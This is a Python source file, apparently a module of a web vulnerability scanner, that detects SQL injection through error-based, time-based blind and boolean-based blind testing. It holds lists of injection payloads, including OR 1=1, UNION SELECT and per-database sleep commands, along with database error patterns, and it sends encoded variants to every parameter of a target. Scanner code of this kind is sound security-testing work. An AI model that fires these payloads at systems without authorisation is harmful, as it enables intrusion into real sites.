"""SQL injection detection -- error-based + time-based blind."""
import re
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

from scanner.modules.base import BaseModule
from scanner.core.html_utils import _extract_params, _make_test_url
from scanner.core.encoding import generate_variants, SQLI_TECHNIQUES, TECHNIQUE_FUNCS


# ── Error-Based Payloads ────────────────────────────────────────────
ERROR_PAYLOADS = [
    "'",
    '"',
    "')",
    '")',
    "\\",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' OR 1=1--",
    "1' UNION SELECT NULL--",
    "1; SELECT 1--",
]

# ── DB Error Keyword Patterns ───────────────────────────────────────
DB_ERROR_PATTERNS = {
    "MySQL": [
        r"SQL syntax",
        r"mysql_fetch",
        r"MySQL Error",
        r"Warning.*mysql",
        r"valid MySQL",
    ],
    "PostgreSQL": [
        r"PostgreSQL",
        r"psql",
        r"pg_query",
        r"ERROR:\s+syntax error",
    ],
    "MSSQL": [
        r"SQL Server",
        r"ODBC",
        r"mssql",
        r"SqlException",
        r"Unclosed quotation mark",
    ],
    "Oracle": [
        r"ORA-\d+",
        r"Oracle",
        r"PL/SQL",
        r"quoted string not properly terminated",
    ],
}

# ── Time-Based Sleep Payloads ────────────────────────────────────────
SLEEP_PAYLOADS = [
    {"db": "MySQL", "payload": "' OR IF(1=1,SLEEP(5),0)--"},
    {"db": "PostgreSQL", "payload": "'; SELECT pg_sleep(5)--"},
    {"db": "MSSQL", "payload": "'; WAITFOR DELAY '00:00:05'--"},
    {"db": "Oracle", "payload": "'; BEGIN DBMS_LOCK.SLEEP(5); END;--"},
]

DEFAULT_THRESHOLD = 5  # seconds

# ── Boolean-Based Payloads ──────────────────────────────────────────
BOOL_PAYLOADS = [
    {"name": "numeric", "true": " AND 1=1", "false": " AND 1=2"},
    {"name": "string", "true": " AND 'a'='a", "false": " AND 'a'='b"},
    {"name": "subquery", "true": " AND (SELECT 1)=1", "false": " AND (SELECT 1)=2"},
]

NO_RESULT_KEYWORDS = [
    "no results", "not found", "no records", "0 results",
    "nothing found", "查询结果为空", "没有找到", "暂无数据",
    "找不到", "未找到", "无结果",
]


# ── Pure Functions (testable) ────────────────────────────────────────

def _check_error_patterns(text):
    """Scan response text for DB error keywords. Returns {db, keyword} or None."""
    for db, patterns in DB_ERROR_PATTERNS.items():
        for pat in patterns:
            if re.search(pat, text, re.IGNORECASE):
                return {"db": db, "keyword": pat}
    return None


def _build_baseline_time(url, send_request):
    """Send 3 normal requests, return average response time in seconds."""
    times = []
    for _ in range(3):
        start = time.perf_counter()
        try:
            send_request(url)
        except Exception:
            pass
        elapsed = time.perf_counter() - start
        times.append(elapsed)
    return sum(times) / len(times) if times else 0.0


def _strip_dynamic(text):
    """Remove dynamic content for reliable comparison.

    Strips: Unix timestamps (10-13 digits), hex tokens (32+ chars),
    script tag content, normalizes whitespace.
    """
    text = re.sub(r'(?<!\d)\d{10,13}(?!\d)', '', text)
    text = re.sub(r'(?<![0-9a-f])[0-9a-f]{32,}(?![0-9a-f])', '', text)
    text = re.sub(r'(?<![0-9a-f])[0-9a-f]{64,}(?![0-9a-f])', '', text)
    text = re.sub(r'<script[^>]*>.*?</script>', '', text, flags=re.S | re.I)
    text = re.sub(r'\s+', ' ', text)
    return text.strip()


def _compare_responses(true_html, false_html):
    """Compare TRUE vs FALSE responses using 3 indicators.

    Returns (verdict: bool, indicators: list, detail: str).
    Verdict is True when >= 2 of 3 indicators trigger.
    """
    votes = 0
    indicators = []
    ratio = 0.0

    # Indicator 1: body length ratio > 5%
    len_true = len(true_html)
    len_false = len(false_html)
    max_len = max(len_true, len_false)
    if max_len > 0:
        ratio = abs(len_true - len_false) / max_len
        if ratio > 0.05:
            votes += 1
            indicators.append("body_length")

    # Indicator 2: stripped content hash
    clean_true = _strip_dynamic(true_html)
    clean_false = _strip_dynamic(false_html)
    if clean_true != clean_false:
        votes += 1
        indicators.append("body_hash")

    # Indicator 3: no-result keywords in FALSE but not TRUE
    false_lower = false_html.lower()
    true_lower = true_html.lower()
    for kw in NO_RESULT_KEYWORDS:
        if kw in false_lower and kw not in true_lower:
            votes += 1
            indicators.append("content_keyword")
            break

    detail_parts = []
    if "body_length" in indicators:
        detail_parts.append(f"length diff {ratio*100:.1f}%")
    if "body_hash" in indicators:
        detail_parts.append("hash mismatch")
    if "content_keyword" in indicators:
        detail_parts.append("no-result keyword")

    return votes >= 2, indicators, ", ".join(detail_parts)


# ── SqliModule ───────────────────────────────────────────────────────

class SqliModule(BaseModule):
    name = "sqli"
    description = "Detect SQL injection via error + time-based blind"
    requires_url = True

    def run(self, target, request_handler, output, threads=10):
        """Run error-based and time-based SQLi detection."""
        target = target.rstrip("/")
        output.log_progress(f"Fetching {target} for parameter extraction...")

        try:
            resp = request_handler.get(target)
            html = resp.text
        except Exception as e:
            output.log_progress(f"Failed to fetch {target}: {e}")
            return {"module": self.name, "findings": []}

        param_names = _extract_params(target, html)

        # If URL has no obvious params, try the URL query itself
        if not param_names:
            parsed = urllib.parse.urlparse(target)
            if parsed.query:
                param_names = [
                    {"name": k, "method": "GET"}
                    for k in urllib.parse.parse_qs(parsed.query).keys()
                ]

        if not param_names:
            output.log_progress("No testable parameters found on this page")
            return {"module": self.name, "findings": []}

        param_list = [f"{p['name']}({p['method']})" for p in param_names]
        output.log_progress(f"Found {len(param_names)} potential parameters: {param_list}")

        findings = []
        param_has_error = set()
        param_has_time = set()

        # Phase 1: Error-based (fast, 3 concurrent requests)
        output.log_progress(f"Phase 1: Error-based testing ({len(ERROR_PAYLOADS)} payloads)")
        with ThreadPoolExecutor(max_workers=max(2, min(threads, 10))) as pool:
            futures = {}
            for entry in param_names:
                pname = entry["name"]
                method = entry["method"]
                for error_payload in ERROR_PAYLOADS:
                    for encoded, tech in generate_variants(error_payload, SQLI_TECHNIQUES):
                        if method == "POST":
                            test_url = target
                            futures[pool.submit(
                                request_handler.post, target,
                                data={pname: encoded}
                            )] = (pname, error_payload, test_url, tech)
                        else:
                            test_url = _make_test_url(target, pname, encoded)
                            futures[pool.submit(
                                request_handler.get, test_url
                            )] = (pname, error_payload, test_url, tech)

            bar = output.create_progress_bar("Error-Based", len(futures))
            for future in as_completed(futures):
                pname, payload, test_url, tech = futures[future]
                try:
                    resp = future.result()
                    match = _check_error_patterns(resp.text)
                    if match:
                        if pname not in param_has_error:
                            param_has_error.add(pname)
                            finding = {
                                "type": "error_based",
                                "parameter": pname,
                                "url": test_url,
                                "database": match["db"],
                                "encoding": tech,
                                "evidence": (
                                    f"DB error keyword '{match['keyword']}' "
                                    f"found in response (encoding: {tech})"
                                ),
                            }
                            findings.append(finding)
                            output.log_finding(self.name, finding)
                except Exception:
                    pass
                output.update_progress(bar)
            bar.close()

        # Determine which params need Phase 2
        time_based_targets = [
            entry for entry in param_names
            if entry["name"] not in param_has_error
        ]

        # Phase 2: Time-based blind for params without error matches
        if time_based_targets:
            output.log_progress(
                f"Phase 2: Time-based blind ({len(time_based_targets)} params, "
                f"{len(SLEEP_PAYLOADS)} DB types)"
            )
            with ThreadPoolExecutor(max_workers=max(2, min(threads, 10))) as pool:
                # Compute baseline for each parameter
                param_baselines = {}
                for entry in time_based_targets:
                    pname = entry["name"]
                    if entry["method"] == "POST":
                        baseline = _build_baseline_time(
                            target,
                            lambda u, n=pname: request_handler.post(u, data={n: "1"})
                        )
                    else:
                        base_url = _make_test_url(target, pname, "1")
                        baseline = _build_baseline_time(base_url, request_handler.get)
                    param_baselines[pname] = baseline
                    output.log_progress(f"  {pname} baseline: {baseline*1000:.0f}ms")

                # Test sleep payloads
                futures = {}
                for entry in time_based_targets:
                    pname = entry["name"]
                    for sp in SLEEP_PAYLOADS:
                        for encoded, tech in generate_variants(sp["payload"], SQLI_TECHNIQUES):
                            if entry["method"] == "POST":
                                test_url = target
                                futures[pool.submit(
                                    self._timed_request,
                                    lambda u, n=pname, pl=encoded: (
                                        request_handler.post(u, data={n: pl})
                                    ),
                                    target
                                )] = (
                                    pname, sp["db"], sp["payload"], test_url,
                                    param_baselines[pname], tech,
                                )
                            else:
                                test_url = _make_test_url(target, pname, encoded)
                                futures[pool.submit(
                                    self._timed_request, request_handler.get, test_url
                                )] = (
                                    pname, sp["db"], sp["payload"], test_url,
                                    param_baselines[pname], tech,
                                )

                bar = output.create_progress_bar("Time-Based", len(futures))
                for future in as_completed(futures):
                    pname, db, payload, test_url, baseline, tech = futures[future]
                    try:
                        elapsed = future.result()
                        threshold = max(baseline * 3, DEFAULT_THRESHOLD)
                        if elapsed is not None and elapsed > threshold:
                            finding = {
                                "type": "time_based",
                                "parameter": pname,
                                "url": test_url,
                                "database": db,
                                "encoding": tech,
                                "baseline_ms": round(baseline * 1000),
                                "response_ms": round(elapsed * 1000),
                                "evidence": (
                                    f"Response delayed {elapsed*1000:.0f}ms "
                                    f"vs baseline {baseline*1000:.0f}ms "
                                    f"(encoding: {tech})"
                                ),
                            }
                            findings.append(finding)
                            output.log_finding(self.name, finding)
                            param_has_time.add(pname)
                    except Exception:
                        pass
                    output.update_progress(bar)
                bar.close()

        # Phase 3: Boolean-based blind for params without error or time hits
        bool_targets = [
            entry for entry in param_names
            if entry["name"] not in param_has_error
            and entry["name"] not in param_has_time
        ]

        if bool_targets:
            output.log_progress(
                f"Phase 3: Boolean-based blind ({len(bool_targets)} params, "
                f"{len(BOOL_PAYLOADS)} pairs)"
            )
            with ThreadPoolExecutor(max_workers=max(2, min(threads, 10))) as pool:
                futures = {}
                for entry in bool_targets:
                    pname = entry["name"]
                    method = entry["method"]
                    for pair in BOOL_PAYLOADS:
                        for encoded, tech in generate_variants(pair["true"], SQLI_TECHNIQUES):
                            # FALSE — encode with same technique
                            if tech == "plain":
                                false_encoded = pair["false"]
                            else:
                                false_encoded = TECHNIQUE_FUNCS[tech](pair["false"])

                            if method == "POST":
                                true_url = target
                                futures[pool.submit(
                                    request_handler.post, target,
                                    data={pname: encoded}
                                )] = (pname, pair, True, true_url, tech)
                                false_url = target
                                futures[pool.submit(
                                    request_handler.post, target,
                                    data={pname: false_encoded}
                                )] = (pname, pair, False, false_url, tech)
                            else:
                                true_url = _make_test_url(target, pname, encoded)
                                futures[pool.submit(
                                    request_handler.get, true_url
                                )] = (pname, pair, True, true_url, tech)
                                false_url = _make_test_url(target, pname, false_encoded)
                                futures[pool.submit(
                                    request_handler.get, false_url
                                )] = (pname, pair, False, false_url, tech)

                bar = output.create_progress_bar("Boolean-Blind", len(futures))
                pairs_cache = {}
                for future in as_completed(futures):
                    pname, pair, is_true, url, tech = futures[future]
                    key = (pname, pair["name"], tech)
                    try:
                        resp = future.result()
                        if key not in pairs_cache:
                            pairs_cache[key] = {
                                "true_html": None, "false_html": None,
                                "true_url": None, "false_url": None,
                            }
                        if is_true:
                            pairs_cache[key]["true_html"] = resp.text
                            pairs_cache[key]["true_url"] = url
                        else:
                            pairs_cache[key]["false_html"] = resp.text
                            pairs_cache[key]["false_url"] = url

                        cache = pairs_cache[key]
                        if cache["true_html"] is not None and cache["false_html"] is not None:
                            verdict, indicators, detail = _compare_responses(
                                cache["true_html"], cache["false_html"]
                            )
                            if verdict:
                                finding = {
                                    "type": "boolean_based",
                                    "parameter": pname,
                                    "true_url": cache["true_url"],
                                    "false_url": cache["false_url"],
                                    "payload_pair": pair["name"],
                                    "encoding": tech,
                                    "indicators": indicators,
                                    "evidence": (
                                        f"TRUE/FALSE response differ: {detail} "
                                        f"(encoding: {tech})"
                                    ),
                                }
                                findings.append(finding)
                                output.log_finding(self.name, finding)
                                param_has_time.add(pname)
                            del pairs_cache[key]
                    except Exception:
                        if key in pairs_cache:
                            pairs_cache.pop(key, None)
                    output.update_progress(bar)
                bar.close()

        output.log_progress(f"SQLi scan done: {len(findings)} potential injections found")
        return {"module": self.name, "findings": findings}

    def _timed_request(self, get_func, url):
        """Make a request and return elapsed time in seconds, or None on failure."""
        start = time.perf_counter()
        try:
            get_func(url)
            return time.perf_counter() - start
        except Exception:
            return None
